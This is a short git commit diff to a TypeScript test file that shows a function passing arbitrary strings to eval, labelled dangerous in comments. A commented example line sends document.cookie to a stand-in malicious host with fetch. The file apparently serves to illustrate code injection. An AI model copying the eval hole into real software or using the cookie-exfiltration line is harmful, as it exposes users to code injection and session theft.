cc882257653331527eb06581c25bb90725156e22
mightysai1997 <110396758+mightysai1997@users.noreply.github.com>
2024-08-14 12:05:39 +0530

    Update test.ts

--- test.ts
+++ test.ts
@@ -1,7 +1,19 @@
-function executeCode(userInput: string) {
-    eval(userInput);
+/**
+ * Executes a piece of code provided as a string.
+ * @param code - The code to execute.
+ */
+function executeCode(code: string): void {
+    // Dangerous: Executes any code passed to it as a string
+    eval(code);
 }
 
-// Usage
-const userCode = "console.log('This is dangerous!');";
-executeCode(userCode);
+// Example usage: Potentially unsafe user input
+const userInput = `
+    console.log('This code is executed!');
+    alert('This is dangerous!');
+    // Malicious code could be injected here
+    // For example: fetch('http://malicious-site.com?data=' + encodeURIComponent(document.cookie));
+`;
+
+// Invoke the function with the unsafe code
+executeCode(userInput);
